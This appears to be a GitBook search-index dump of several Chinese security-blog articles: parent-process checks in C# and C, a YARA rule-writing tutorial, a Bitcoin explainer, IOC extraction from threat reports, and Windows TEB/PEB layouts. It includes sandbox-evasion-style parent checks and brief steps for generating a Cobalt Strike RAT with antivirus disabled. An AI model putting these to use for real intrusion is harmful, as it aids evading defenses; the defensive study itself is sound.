实现方式很多，基本思路就是： 获得父进程的pid 利用pid查找proc name windows C using System; using System.Diagnostics; using System.Management; using System.Windows.Forms; namespace Check_Father { class check_father_proc { static bool if_proc = true; static void Main(string[] args) { // 获取当前进程对象 try { Process currentProcess = Process.GetCurrentProcess(); if (GetParentProcess(currentProcess).ProcessName.Equals(\"explore\")) { if_proc = true; } else { Console.WriteLine($\"{GetParentProcess(currentProcess).ProcessName}\"); } } catch { Environment.Exit(0); } } private static Process GetParentProcess(Process process) { // 获取指定进程的父进程 ID int parentProcessId = 0; ManagementObjectSearcher searcher = new ManagementObjectSearcher($\"SELECT ParentProcessId FROM Win32_Process WHERE ProcessId = {process.Id}\"); ManagementObjectCollection collection = searcher.Get(); foreach (ManagementObject obj in collection) { parentProcessId = Convert.ToInt32(obj[\"ParentProcessId\"]); break; } // 获取父进程对象 Process parentProcess = null; if (parentProcessId > 0) { try { parentProcess = Process.GetProcessById(parentProcessId); } catch (Exception) { parentProcess = null; } } return parentProcess; } } } 调用 GetCurrentProcess() 方法获取当前进程对象。 调用 GetParentProcess() 方法获取当前进程的父进程对象。 判断父进程对象的 ProcessName 属性是否为 \"explorer\"，以确定父进程是否为 Windows Explorer。 其中，步骤 2 主要是通过 WMI (Windows Management Instrumentation) 查询获取当前进程的父进程 ID，然后通过调用 Process.GetProcessById() 方法来获取父进程对象。具体实现是： 调用 ManagementObjectSearcher 对象的 Get() 方法来执行 WMI 查询，查询条件为获取父进程 ID，查询语句为 $\"SELECT ParentProcessId FROM Win32_Process WHERE ProcessId = {process.Id}\"。 遍历查询结果，获取父进程 ID。 调用 Process.GetProcessById() 方法根据父进程 ID 获取父进程对象。 C #include #include #include #include #include //GetModuleFileNameEx int main() { // 获取当前进程句柄 HANDLE currentProcess = GetCurrentProcess(); // 获取当前进程 ID DWORD currentProcessId = GetProcessId(currentProcess); // 获取进程快照 HANDLE snapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0); if (snapshot == INVALID_HANDLE_VALUE) { printf(\"CreateToolhelp32Snapshot failed, error code %d\\n\", GetLastError()); return 0; } PROCESSENTRY32 processEntry; processEntry.dwSize = sizeof(PROCESSENTRY32); // 遍历进程快照，查找父进程 if (Process32First(snapshot, &processEntry)) { do { if (processEntry.th32ProcessID == currentProcessId) { // 获取当前进程的父进程 ID DWORD parentProcessId = processEntry.th32ParentProcessID; // 根据父进程 ID 获取父进程句柄 HANDLE parentProcess = OpenProcess(PROCESS_QUERY_INFORMATION | PROCESS_VM_READ, FALSE, parentProcessId); if (parentProcess != NULL) { // 获取父进程的名称 TCHAR parentProcessName[MAX_PATH]; if (GetModuleFileNameEx(parentProcess, NULL, parentProcessName, MAX_PATH)) { // 判断父进程名称是否为 explorer.exe if (_tcsicmp(parentProcessName, _T(\"explorer.exe\")) == 0) { printf(\"The parent process is explorer.exe.\\n\"); } else { printf(\"The parent process is %ws.\\n\", parentProcessName); } } else { printf(\"GetModuleFileNameEx failed, error code %d\\n\", GetLastError()); } CloseHandle(parentProcess); } else { printf(\"OpenProcess failed, error code %d\\n\", GetLastError()); } break; } } while (Process32Next(snapshot, &processEntry)); } else { printf(\"Process32First failed, error code %d\\n\", GetLastError()); } CloseHandle(snapshot); return 0; } 使用 GetCurrentProcess() 获取当前进程的句柄。 使用 GetProcessId() 获取当前进程的 ID。 使用 CreateToolhelp32Snapshot() 创建进程快照。 遍历进程快照，查找父进程。使用 Process32First() 获取第一个进程的信息，然后使用 Process32Next() 遍历下一个进程，直到找到当前进程。 获取当前进程的父进程 ID，并使用 OpenProcess() 函数打开父进程的句柄。 使用 `GetModuleFileName Linux 因为linux是基于文件的，所以需要通过文件来获得进程名称，但是linux有现成的函数可以直接得到父进程的pid，各有千秋。 进程对应的进程号在/proc目录下存在一个对应pid的目录。 随便进去一个可以看到很多文件 comm文件里面存放的就是进程的名称 C #include #include #include #include #include int main() { pid_t pid = getpid(); pid_t ppid = getppid(); char filename[256]; // 获取当前进程名称 snprintf(filename, sizeof(filename), \"/proc/%d/comm\", pid); // 构造文件名 FILE* fp = fopen(filename, \"r\"); // 打开文件 if (fp) { char name[256]; fgets(name, sizeof(name), fp); // 读取进程名称 name[strcspn(name, \"\\n\")] = 0; // 去除换行符 printf(\"current process name: %s\\n\", name); fclose(fp); // 关闭文件 } else { printf(\"failed to open file: %s\\n\", filename); } // 获取父进程的进程名称 snprintf(filename, sizeof(filename), \"/proc/%d/comm\", ppid); // 构造文件名 fp = fopen(filename, \"r\"); // 打开文件 if (fp) { char name[256]; fgets(name, sizeof(name), fp); // 读取进程名称 name[strcspn(name, \"\\n\")] = 0; // 去除换行符 printf(\"current process parent name: %s\\n\", name); fclose(fp); // 关闭文件 } else { printf(\"failed to open file: %s\\n\", filename); } return 0; } 没有版权，随便复制，免费的知识应该共享 all right reserved，powered by Gitbook该文章修订时间： 2023-03-19 19:46:56 "},"MyArticles/CyberSec.html":{"url":"MyArticles/CyberSec.html","title":"CyberSec","keywords":"","body":"雪暗凋旗画，风多杂鼓声。宁为百夫长，胜作一书生。 没有版权，随便复制，免费的知识应该共享 all right reserved，powered by Gitbook该文章修订时间： 2023-03-19 13:40:33 "},"MyArticles/CyberSec/yara.html":{"url":"MyArticles/CyberSec/yara.html","title":"YARA学习","keywords":"","body":"官方文档说明：https://yara.readthedocs.io/en/v3.7.0/index.html 官方的github库地址：https://github.com/VirusTotal/yara/releases bilibili学习分享：https://www.bilibili.com/video/BV1dt4y12753/ Yara是什么 YARA is a tool aimed at (but not limited to) helping malware researchers to identify and classify malware samples. With YARA you can create descriptions of malware families (or whatever you want to describe) based on textual or binary patterns. Each description, a.k.a rule, consists of a set of strings and a boolean expression which determine its logic.【https://virustotal.github.io/yara/】 yara用处 样本分类 快速筛选 过滤文件 自定义CTF题目类型 完成任务 识别漏洞 安装 windows 直接下载之后解压，在path变量里写入路径，可以在终端直接yara Mac brew install yara 使用 命令解释 > yara --help YARA 4.2.2, the pattern matching swiss army knife. Usage: yara [OPTION]... [NAMESPACE:]RULES_FILE... FILE | DIR | PID Mandatory arguments to long options are mandatory for short options too. --atom-quality-table=FILE path to a file with the atom quality table -C, --compiled-rules 加载已经编译的规则 -c, --count 显示中标的样本个数 -d, --define=VAR=VALUE 定义外部变量 --fail-on-warnings 出现警告时运行失败 -f, --fast-scan 快速匹配模式 -h, --help 显示帮助并退出 -i, --identifier=IDENTIFIER 只显示名为IDENTIFIERd --max-process-memory-chunk=NUMBER 设置扫描进程的最大值 (default=1073741824) -l, --max-rules=NUMBER 扫描达到设定值后退出 --max-strings-per-rule=NUMBER 设定每个进程的最大字符串匹配数(default=10000) -x, --module-data=MODULE=FILE 将FIle的内容作为额外的数据传递给MOUDLE -n, --negate 只显示不满足的规则 (negate) -N, --no-follow-symlinks 扫描时不跟随符号连接 -w, --no-warnings 禁用警告 -m, --print-meta 打印元数据 -D, --print-module-data 打印模块数据 -e, --print-namespace 显示规则的命名空间 -S, --print-stats 打印规则的统计信息 -s, --print-strings 打印匹配的字符串 -L, --print-string-length 打印匹配字符串的长度 -g, --print-tags 打印标签 -r, --recursive 递归扫描目录 --scan-list 扫描FILE中列出的文件，每行显示以一个 -z, --skip-larger=NUMBER 跳过目录中size大于设置size的文件 -k, --stack-size=SLOTS 设置最大堆栈的大小 (default=16384) -t, --tag=TAG 只打印标记为tag的规则 -p, --threads=NUMBER 使用指定的线程数扫描目录 -a, --timeout=SECONDS 在达到给定的时间（s）之后跳出扫描 -v, --version 显示yara的当前版本信息 Send bug reports and suggestions to: vmalvarez@virustotal.com. 向 vmalvarez@virustotal.com 发送建议和bug 一般结构 banker.yara文件： rule silent_banker : banker { meta: description = \"This is just an example\" thread_level = 3 in_the_wild = true strings: $a = {6A 40 68 00 30 00 00 6A 14 8D 91} $b = {8D 4D B0 2B C1 83 C0 27 99 6A 4E 59 F7 F9} $c = \"UVODFRYSIHLNWPEJXQZAKCBGMT\" condition: $a or $b or $c } 规则一般写在后缀为yara的文件里。利用yara banker.yara来执行 第一行：对于该yara规则的说明。指出这是一个banker类型的样本匹配规则 第三行：meta关键字后面跟一些面描述信息。 第七行：strings关键字后：定义了三个变量，利用{}的形式写16进制字符串 第十一行：condition关键字后：利用or关键字表示如果匹配文件中了其中一个，则算为banker malware。 可以看到： 16进制 ==》 {} 通配符 使用?作为通配符，可以代表任何内容，大小是一个半个字节。 rule WildcardExample { strings: $hex_string = { E2 34 ?? C8 A? FB } condition: $hex_string } 跳转 利用[n-n+x]的方式进行跳转，指的是跳过一定数量的字节。如下程序是跳过4-6个字节 rule JumpExample { strings: $hex_string = { F4 23 [4-6] 62 B4 } condition: $hex_string } [-]代表无限制跳转，不限制跳转个数 字符串 ==》 “str” nocase：不区分大小写，适用于字符串 base64：base64字符串 xor：异或字符串 wide：宽字符 wide 如果字符串“Borland”显示为编码为每个字符两个字节（即 ），则以下规则将匹配：B\\x00o\\x00r\\x00l\\x00a\\x00n\\x00d\\x00 rule WideCharTextExample1 { strings: $wide_string = \"Borland\" wide condition: $wide_string } xor 搜索应用于字符串“ ”（包括纯文本字符串）的每个字节 XOR形式： rule XorExample5 { strings: $xor_string = \"This program cannot\" xor(0x01-0xff) condition: $xor_string } 这就等效于 rule XorExample2 { strings: $xor_string_00 = \"This program cannot\" $xor_with_1 = \"Uihr!qsnfs`l!b`oonu\" $xor_with_2 = \"Vjkq\\\"rpmepco\\\"acllmv\" …… condition: any of them } base64 rule Base64Example1 { strings: $a = \"This program cannot\" base64 condition: $a } 支持自定义的base码表 rule Base64Example2 { strings: $a = \"This program cannot\" base64(\"!@#$%^&*(){}[].,|ABCDEFGHIJ\\x09LMNOPQRSTUVWXYZabcdefghijklmnopqrstu\") condition: $a } 字符串计数 该字符串在文件或进程内存中出现了多少次。每个字符串的出现次数由一个变量表示，该变量的名称是字符串标识符，但用 # 字符代替 $ 字符 rule CountExample { strings: $a = \"dummy1\" $b = \"dummy2\" condition: #a == 6 and #b > 10 } 从YARA 4.2.0开始，可以在整数范围内表示字符串的计数 #a in (filesize-500..filesize) == 2 代表了文件最后500字节的数据内必须存在a字符串两次 字符串集 命中多个字符串的其中一个就可以 rule OfExample1 { strings: $a = \"dummy1\" $b = \"dummy2\" $c = \"dummy3\" condition: 2 of ($a,$b,$c) } 文件中必须至少存在集合中的两个字符串（$a，$b，$c）。 也可以使用通配符来写： rule OfExample2 { strings: $foo1 = \"foo1\" $foo2 = \"foo2\" $foo3 = \"foo3\" condition: 2 of ($foo*) } rule OfExample3 { strings: $foo1 = \"foo1\" $foo2 = \"foo2\" $bar1 = \"bar1\" $bar2 = \"bar2\" condition: 3 of ($foo*,$bar1,$bar2) } 甚至也可以写成 condition: 1 of them 从YARA 4.2.0开始，可以在整数范围内表示一组字符串，如下所示： all of ($a*) in (filesize-500..filesize) any of ($a*, $b*) in (1000..2000) 添加过滤 size过滤 在从大量的文件中获取样本时，可能需要根据样本的大小特征进行过滤；否则会对每一个文件都进行匹配 condition: filesize > 200KB and filesize 入口点过滤 yara3.0之前可以用entry_point来获得程序入口点；yara3.0之后通过pe.entry_point变量来获得入口点 注意：入口点的地址需要写offset（File Offset），并不是在ida中看到的entry_point。[这个是自动获取的，不需要预先定义]。 condition: pe.entry_point == 0x990 at取值 同样适用于匹配入口点. string: $entry = {48 83 EC 28} condition: $entry at pe.entry_point 这里利用的是匹配入口点地址对应的数据 文件头判断 利用uint16(0) 的方式取文件的前两个字节，可以判断一般文件的文件头。 condition: unit16(0) == 0x4D5A and uint32(uint32(0x3C)) == 0x00004550 0x4D5A是一般PE文件的开头 ”MZ“ . ps: uint16是16位无符号整型，就是两个字节 之上提到的所有condition都可以通过and进行连接 访问给定位置的数据 使用下列函数之一从给定偏移量的文件读取数据： int8() int16() int32() uint8() uint16() uint32() int8be() int16be() int32be() uint8be() uint16be() uint32be() 函数从读取 8、16 和 32 位有符号整数，而函数读取无符号整数。16 位和 32 位整数都被视为小端序。 迭代器 for..of for any section in pe.sections : ( section.name == \".text\" ) 相当于是 for any i in (0..pe.number_of_sections-1) : ( pe.sections[i].name == \".text\" ) 迭代字典时，必须提供两个变量名称，用于保存字典中每个条目的键和值 for any k,v in some_dict : ( k == \"foo\" and v == \"bar\" ) 规则条件 and：与 or：或 not：非 [all of them]：所有条件匹配即告警 [any of them]：有一个条件匹配即告警 [a and b and $c]：abc同时匹配即告警 [(a and b) or $c]：匹配a和b或c即告警 引用其他规则 利用规则集的形式引用其他规则 rule Rule1 { strings: $a = \"dummy1\" condition: $a } rule Rule2 { strings: $a = \"dummy2\" condition: $a } rule MainRule { strings: $a = \"dummy2\" condition: any of (Rule*) } 演示 cs启用 一个压缩包包含了服务端和客户端 在服务端用sudo运行./teamserver 服务器ip 密码，vps注意提前打开端口 客户端运行start.bat，直接按照刚才的方式连接就行。用户名随意 到这里就可以用了。 打开attack 这里可以生成一个很简单的malware 然后在指定目录生成一个rat。注意关闭杀毒软件，不然直接杀 提取特征工具 010editor：查看文件类型、文件对比、HEX查看 调试器：查找特征值 CFF、PEstudio等pe工具分析PE文件 一些文件格式的总结 运用 自动化工具 yargen：是一个自动化提取yara规则的工具，可以提取strings和opcodes特征，其原理是先解析出样本集中的共同的字符串，然后经过白名单库的过滤，最后通过启发式、机器学习等方式筛选出最优的yara规则。访问地址 更加高效 避免创建常见的导入导出表的规则，因为相同编译器的结果基本一样 通过文件头之类的文件特征进行初筛 设定大小，防止耗尽资源本机蓝屏 匹配互斥体、注册表值、PDB路径、硬编码的密钥或者密文、C2地址 没有版权，随便复制，免费的知识应该共享 all right reserved，powered by Gitbook该文章修订时间： 2023-03-19 15:47:10 "},"MyArticles/CyberSec/关于bitcoin.html":{"url":"MyArticles/CyberSec/关于bitcoin.html","title":"啥是Bitcoin","keywords":"","body":"作为一个能直接影响密码学、硬件价格、驱动开发、黑客攻击、经济市场的货币，bitcoin确实是22年之前最火的一种虚拟货币。 简介 1、bitcoin一般用来形容比特币本身，当出现Bitcoin的时候，大概率是在谈论比特币的技术形式。 最小的bit币单位是0.00000001。 2、比特币本身作为一种去中心化的货币，不存在类似中央银行一样的中心节点，所以银行卡丢失可以补办，但是比特币密钥丢失那就寄了。 3、比特币的去中心化技术依托于P2P网络，这是一种端到端的网络模式，《图解密码技术》将其归结为“基于p2p网络的支付结算系统”，比特币用户通过使用这一结算系统实现了价值转移。 4、比特币交易是在比特币地址之间完成的，而且每一次成交的地址一般不同，但是捐赠场景会使用同一个地址。 地址生成 讲DSA的公钥输入SHA-256和RIPEDM-160这俩单项散列算法生成散列值，附加一些必要信息，通过base58check进行编码成字符串（不使用0O，Il）。 生成的地址一般是以“1”开头的base编码字符串。 钱包：比特币用户使用的客户端 区块链 保存比特币全部交易的公共账本，讲交易以区块为单位进行的存储 作用：记录所有地址的所有交易（A地址-1，B地址+1这种形式），可以在任意一个地址计算出当前所拥有的比特币数量。 添加区块 比特币以“交易”为单位进行，若干条交易会组成一个区块，当P2P网络确认区块的添加之后，相应的交易就成立了。 其中头部组成为： 上一个区块区块头的hash（H2） 本区块所有交易的hash值（T2） nonce：一个任意数值 一个时间戳 如果一个节点的任意一个数据发生变化，该节点之后的所有数据都需要随之变化。 交易 从一个地址向另一个地址支付比特币的行为。 s:商店；c:顾客 s和c先通过社交或者其他手段确定身份 ---> 商店s创建 公钥B-密钥b对 并利用B生成地址B·，发给顾客c。 顾客c创建 公钥A-密钥a对 并利用A生成地址A· ---> 顾客c创建交易过程 “A·向B·支付1bitcoin” 并利用a对交易进行签名（DSA算法） ---> 顾客c将交易发布到P2P网络（向所有的比特币用户广播消息，这需要一定的手续费）。 这条交易信息和其他的信息合并到一个区块中，区块添加到区块链中。 P2P网络确认了区块，这时交易成立。 挖矿 挖矿的由来： 1、将新的区块添加到区块链 --相当于--> 创造新的比特币余额 --相当于--> 从bit矿中挖出bitcoin 2、最初，比特币协议规定每个区块奖励为50个比特币，但在减半周期结束后，这个奖励会减半为25个比特币。到2020年，这个奖励已经减半到6.25个比特币。当所有的比特币都被挖出来后，就不再产生新的比特币了。 3、矿工还可以从交易费中获得收入。每当一个比特币交易被广播到网络中时，交易发起人需要支付一定的交易费，这些费用将被添加到区块中，并成为矿工的收入之一。因此，即使区块奖励减少到零，矿工仍然可以通过收取交易费来获得收入。 奖励 因为比特币区块链称为单链，所以同一时间只能由一人进行添加，成功添加的人会获得奖励和该区块进行交易的手续费 PoW 工作量证明（Proof of Work），矿工必须证明自己的工作量以此证明区块不是被伪造的，通过散列值来证明。 添加新的区块首先需要一个合法的区块头，区块头中的“前一个区块的散列值”拥有特定格式，他的前面的若干位必须为0 为了达到这个目的就需要上面提到的那个随机数，矿工需要不断的尝试这个随机数以此达到产生合法散列值的要求。 这就可以用来证明矿工的工作量，计算的难度是由前面0的个数进行控制的。 P2P的确认 有可能同一时间多个节点计算出了正确的区块，因为p2p网络的局限性，无法得知哪一个区块先到达节点（a区块先到了张三的节点，但是b区块先到达了Mike先生的节点），具体将哪一个添加到区块链中需要p2p网络的确定。 最终选择的是计算量大的分析（假设是正义的矿工的资源大于邪恶矿工的资源） 匿名性 这里的匿名并非是绝对匿名，虽然不用每一笔交易都带上自己的电话身份证户口本，但是基于网络的交易会暴露你的ip，同时会暴露本次交易的地址（因为你向公众进行了广播），同时交易信息也是摆在明面上的。 安全性（信任） 交易安全 你给对面钱了之后，对面跑路了，没辙，因为没有中心无法追责 虽然没有中心，但是为了减少时间差和方便流通，依旧存在各种交易所，交易所卷钱跑路 --》没辙 系统安全 你的钱包被盗了，或者安装了木马性质的软件导致密钥丢失，活该没辙 参考 《图解密码技术》 chatgpt https://www.8btc.com/books/834/masterbitcoin2cn/_book/ch10.html https://www.blockchain.com/ 没有版权，随便复制，免费的知识应该共享 all right reserved，powered by Gitbook该文章修订时间： 2023-03-21 23:34:25 "},"MyArticles/CyberSec/IOC-痛苦金字塔.html":{"url":"MyArticles/CyberSec/IOC-痛苦金字塔.html","title":"从痛苦金字塔学习分析报告","keywords":"","body":" 痛苦金字塔简单，主要是学习如何学习一篇一次攻击的分析报告。利用一个中长篇的分析报告来学习 Bvp47-美国NSA方程式组织的顶级后门 从报告中各取所需 报告分析 1、分类 首先根据目录和简介对报告进行按照内容进行分类。 分类之后根据所分的类进行归纳总结。 事件层面 统述了事情发展的开始-中间-结束。主要的目标是这个事件 谁是攻击者 为什么攻击（目标、目的） 是如何发现并归因的（可能不公开） 结合到痛苦金字塔，这些内容是基于IOC信息上抽象总结出来的，在金字塔顶。 因为水平较高，所以在报告中并不是总能看见他，碰运气。 技术层面 主要针对的是事件中的主要样本，相当于ctf里的wp 样本是什么 样本用什么技术实现了什么目的 样本技术中有没有新颖的地方 2、威胁情报 以 前所未见的后门 为例； 读完之后需要构建大体的流程图或者框架图。 上述流程过于概况，一般的攻击流程基本大差不差，根据内容继续精进细节 威胁情报应该具备这样的特质：具体且独特 3、情报处理 从报告中将ioc提取出来，方便聚类分析，需要注意两个问题 是否有效（易变？个性化？） 能否提取（太抽象） 样本hash 每个hash对应一个样本，可信度很高，放心提取。 私钥 一般各个程序中的私钥不会相同，因为私钥的位数太多，如果私钥一样考虑是否为恶意模仿或者同组织或者下属机构……。可以提取，置信度高，不会轻易变化。 标识码 可能某些特殊的样本会存在标识码，可以提取当作ioc，但是因为少见和格式多样，不会一起列出 IP、Domain 这个时效性特别强，需要进行研判。作为一个重要的标志，准确性并不是特别高，尤其是上古样本 文件列表 如果非常特殊且具有明显特色，可以作为特征，但是如果%temp%之类的常见目录就直接忽略即可 函数处理技巧 有效。包括样本流程、整个文件结构、样本处理手法等等。虽然他们非常抽象，但很多信息都可以从这些抽象的内容中获取。像字段结构、环境校验方法等。可以对照着报告和样本来研判一下。 4、对应到金字塔 当填充完金字塔之后，就算是情报完整了。 5、注意的是 不是所有的情报都是有效的情报， 不是所有有效情报都可以被格式化提取的。 可以被批量提取的IOC们都会有一些特征，更方便于情报分析人员进行大批量、格式化的处理。 常见的IOC类型包括：IP、域名、哈希 等。 6、工程化流程 提取ioc工具 ioc_parser：Github 的开源项目，通过正则将常见的IOC类型从报告中提取出来。 yeti：开源的威胁情报平台，内部集成了一个非常友好的报告解析系统，但平台代码本身依然存在一些小小的问题，使用时候的流畅性无法保证。 ioc来源 [Alien Vault][https://otx.alienvault.com/] 开放的威胁情报社区，有很多人将不同的国家不同地区的报告整理成一个个 pulse。可以根据报告搜索，也可以根据IOC进行搜索。 [Covert.io][http://www.covert.io/threat-intelligence/] 很多安全厂商会在发布自己报告的同时发布一份IOC列表，或者由他人二次加工后形成一个IOC库，我们通常将这种定期维护的IOC库称为Feed。有人会将各种Feed地址整理，做数据的二次集成，比方说下面的链接。 twitter：这个也是很常用的一个情报来源，可以获得分享的情报，还有其他有意思的东西。 参考 https://0x666.club/pyramidofpain2/ https://0x666.club/pyramidofpain1/ https://www.pangulab.cn/post/the_bvp47_a_top-tier_backdoor_of_us_nsa_equation_group/ 没有版权，随便复制，免费的知识应该共享 all right reserved，powered by Gitbook该文章修订时间： 2023-03-19 17:30:25 "},"MyArticles/CyberSec/TEB和PEB.html":{"url":"MyArticles/CyberSec/TEB和PEB.html","title":"TEB & PEB","keywords":"","body":"因为这俩结构比较长，所以单独列出来 TEB-线程环境块 线程环境块 ntdll!_TEB +0x000 NtTib : _NT_TIB +0x038 EnvironmentPointer : Ptr64 Void +0x040 ClientId : _CLIENT_ID +0x050 ActiveRpcHandle : Ptr64 Void +0x058 ThreadLocalStoragePointer : Ptr64 Void +0x060 ProcessEnvironmentBlock : Ptr64 _PEB +0x068 LastErrorValue : Uint4B +0x06c CountOfOwnedCriticalSections : Uint4B +0x070 CsrClientThread : Ptr64 Void +0x078 Win32ThreadInfo : Ptr64 Void +0x080 User32Reserved : [26] Uint4B +0x0e8 UserReserved : [5] Uint4B +0x100 WOW32Reserved : Ptr64 Void +0x108 CurrentLocale : Uint4B +0x10c FpSoftwareStatusRegister : Uint4B +0x110 ReservedForDebuggerInstrumentation : [16] Ptr64 Void +0x190 SystemReserved1 : [30] Ptr64 Void +0x280 PlaceholderCompatibilityMode : Char +0x281 PlaceholderHydrationAlwaysExplicit : UChar +0x282 PlaceholderReserved : [10] Char +0x28c ProxiedProcessId : Uint4B +0x290 _ActivationStack : _ACTIVATION_CONTEXT_STACK +0x2b8 WorkingOnBehalfTicket : [8] UChar +0x2c0 ExceptionCode : Int4B +0x2c4 Padding0 : [4] UChar +0x2c8 ActivationContextStackPointer : Ptr64 _ACTIVATION_CONTEXT_STACK +0x2d0 InstrumentationCallbackSp : Uint8B +0x2d8 InstrumentationCallbackPreviousPc : Uint8B +0x2e0 InstrumentationCallbackPreviousSp : Uint8B +0x2e8 TxFsContext : Uint4B +0x2ec InstrumentationCallbackDisabled : UChar +0x2ed UnalignedLoadStoreExceptions : UChar +0x2ee Padding1 : [2] UChar +0x2f0 GdiTebBatch : _GDI_TEB_BATCH +0x7d8 RealClientId : _CLIENT_ID +0x7e8 GdiCachedProcessHandle : Ptr64 Void +0x7f0 GdiClientPID : Uint4B +0x7f4 GdiClientTID : Uint4B +0x7f8 GdiThreadLocalInfo : Ptr64 Void +0x800 Win32ClientInfo : [62] Uint8B +0x9f0 glDispatchTable : [233] Ptr64 Void +0x1138 glReserved1 : [29] Uint8B +0x1220 glReserved2 : Ptr64 Void +0x1228 glSectionInfo : Ptr64 Void +0x1230 glSection : Ptr64 Void +0x1238 glTable : Ptr64 Void +0x1240 glCurrentRC : Ptr64 Void +0x1248 glContext : Ptr64 Void +0x1250 LastStatusValue : Uint4B +0x1254 Padding2 : [4] UChar +0x1258 StaticUnicodeString : _UNICODE_STRING +0x1268 StaticUnicodeBuffer : [261] Wchar +0x1472 Padding3 : [6] UChar +0x1478 DeallocationStack : Ptr64 Void +0x1480 TlsSlots : [64] Ptr64 Void +0x1680 TlsLinks : _LIST_ENTRY +0x1690 Vdm : Ptr64 Void +0x1698 ReservedForNtRpc : Ptr64 Void +0x16a0 DbgSsReserved : [2] Ptr64 Void +0x16b0 HardErrorMode : Uint4B +0x16b4 Padding4 : [4] UChar +0x16b8 Instrumentation : [11] Ptr64 Void +0x1710 ActivityId : _GUID +0x1720 SubProcessTag : Ptr64 Void +0x1728 PerflibData : Ptr64 Void +0x1730 EtwTraceData : Ptr64 Void +0x1738 WinSockData : Ptr64 Void +0x1740 GdiBatchCount : Uint4B +0x1744 CurrentIdealProcessor : _PROCESSOR_NUMBER +0x1744 IdealProcessorValue : Uint4B +0x1744 ReservedPad0 : UChar +0x1745 ReservedPad1 : UChar +0x1746 ReservedPad2 : UChar +0x1747 IdealProcessor : UChar +0x1748 GuaranteedStackBytes : Uint4B +0x174c Padding5 : [4] UChar +0x1750 ReservedForPerf : Ptr64 Void +0x1758 ReservedForOle : Ptr64 Void +0x1760 WaitingOnLoaderLock : Uint4B +0x1764 Padding6 : [4] UChar +0x1768 SavedPriorityState : Ptr64 Void +0x1770 ReservedForCodeCoverage : Uint8B +0x1778 ThreadPoolData : Ptr64 Void +0x1780 TlsExpansionSlots : Ptr64 Ptr64 Void +0x1788 DeallocationBStore : Ptr64 Void +0x1790 BStoreLimit : Ptr64 Void +0x1798 MuiGeneration : Uint4B +0x179c IsImpersonating : Uint4B +0x17a0 NlsCache : Ptr64 Void +0x17a8 pShimData : Ptr64 Void +0x17b0 HeapData : Uint4B +0x17b4 Padding7 : [4] UChar +0x17b8 CurrentTransactionHandle : Ptr64 Void +0x17c0 ActiveFrame : Ptr64 _TEB_ACTIVE_FRAME +0x17c8 FlsData : Ptr64 Void +0x17d0 PreferredLanguages : Ptr64 Void +0x17d8 UserPrefLanguages : Ptr64 Void +0x17e0 MergedPrefLanguages : Ptr64 Void +0x17e8 MuiImpersonation : Uint4B +0x17ec CrossTebFlags : Uint2B +0x17ec SpareCrossTebBits : Pos 0, 16 Bits +0x17ee SameTebFlags : Uint2B +0x17ee SafeThunkCall : Pos 0, 1 Bit +0x17ee InDebugPrint : Pos 1, 1 Bit +0x17ee HasFiberData : Pos 2, 1 Bit +0x17ee SkipThreadAttach : Pos 3, 1 Bit +0x17ee WerInShipAssertCode : Pos 4, 1 Bit +0x17ee RanProcessInit : Pos 5, 1 Bit +0x17ee ClonedThread : Pos 6, 1 Bit +0x17ee SuppressDebugMsg : Pos 7, 1 Bit +0x17ee DisableUserStackWalk : Pos 8, 1 Bit +0x17ee RtlExceptionAttached : Pos 9, 1 Bit +0x17ee InitialThread : Pos 10, 1 Bit +0x17ee SessionAware : Pos 11, 1 Bit +0x17ee LoadOwner : Pos 12, 1 Bit +0x17ee LoaderWorker : Pos 13, 1 Bit +0x17ee SkipLoaderInit : Pos 14, 1 Bit +0x17ee SpareSameTebBits : Pos 15, 1 Bit +0x17f0 TxnScopeEnterCallback : Ptr64 Void +0x17f8 TxnScopeExitCallback : Ptr64 Void +0x1800 TxnScopeContext : Ptr64 Void +0x1808 LockCount : Uint4B +0x180c WowTebOffset : Int4B +0x1810 ResourceRetValue : Ptr64 Void +0x1818 ReservedForWdf : Ptr64 Void +0x1820 ReservedForCrt : Uint8B +0x1828 EffectiveContainerId : _GUID NtTib-线程信息块 Thread Information Block 0:024> dt _NT_TIB ntdll!_NT_TIB +0x000 ExceptionList : Ptr64 _EXCEPTION_REGISTRATION_RECORD ;指向{}结构体的链表指针 +0x008 StackBase : Ptr64 Void +0x010 StackLimit : Ptr64 Void +0x018 SubSystemTib : Ptr64 Void +0x020 FiberData : Ptr64 Void +0x020 Version : Uint4B +0x028 ArbitraryUserPointer : Ptr64 Void +0x030 Self : Ptr64 _NT_TIB ProcessEnvironmentBlock PEB的位置，可以通过teb里的这个成员来定位peb的位置 剩下的还没有发现具体的用处，就先不学了 PEB-进程环境块 进程环境块 ntdll!_PEB +0x000 InheritedAddressSpace : UChar +0x001 ReadImageFileExecOptions : UChar +0x002 BeingDebugged : UChar +0x003 BitField : UChar +0x003 ImageUsesLargePages : Pos 0, 1 Bit +0x003 IsProtectedProcess : Pos 1, 1 Bit +0x003 IsImageDynamicallyRelocated : Pos 2, 1 Bit +0x003 SkipPatchingUser32Forwarders : Pos 3, 1 Bit +0x003 IsPackagedProcess : Pos 4, 1 Bit +0x003 IsAppContainer : Pos 5, 1 Bit +0x003 IsProtectedProcessLight : Pos 6, 1 Bit +0x003 IsLongPathAwareProcess : Pos 7, 1 Bit +0x004 Padding0 : [4] UChar +0x008 Mutant : Ptr64 Void +0x010 ImageBaseAddress : Ptr64 Void +0x018 Ldr : Ptr64 _PEB_LDR_DATA +0x020 ProcessParameters : Ptr64 _RTL_USER_PROCESS_PARAMETERS +0x028 SubSystemData : Ptr64 Void +0x030 ProcessHeap : Ptr64 Void +0x038 FastPebLock : Ptr64 _RTL_CRITICAL_SECTION +0x040 AtlThunkSListPtr : Ptr64 _SLIST_HEADER +0x048 IFEOKey : Ptr64 Void +0x050 CrossProcessFlags : Uint4B +0x050 ProcessInJob : Pos 0, 1 Bit +0x050 ProcessInitializing : Pos 1, 1 Bit +0x050 ProcessUsingVEH : Pos 2, 1 Bit +0x050 ProcessUsingVCH : Pos 3, 1 Bit +0x050 ProcessUsingFTH : Pos 4, 1 Bit +0x050 ProcessPreviouslyThrottled : Pos 5, 1 Bit +0x050 ProcessCurrentlyThrottled : Pos 6, 1 Bit +0x050 ProcessImagesHotPatched : Pos 7, 1 Bit +0x050 ReservedBits0 : Pos 8, 24 Bits +0x054 Padding1 : [4] UChar +0x058 KernelCallbackTable : Ptr64 Void +0x058 UserSharedInfoPtr : Ptr64 Void +0x060 SystemReserved : Uint4B +0x064 AtlThunkSListPtr32 : Uint4B +0x068 ApiSetMap : Ptr64 Void +0x070 TlsExpansionCounter : Uint4B +0x074 Padding2 : [4] UChar +0x078 TlsBitmap : Ptr64 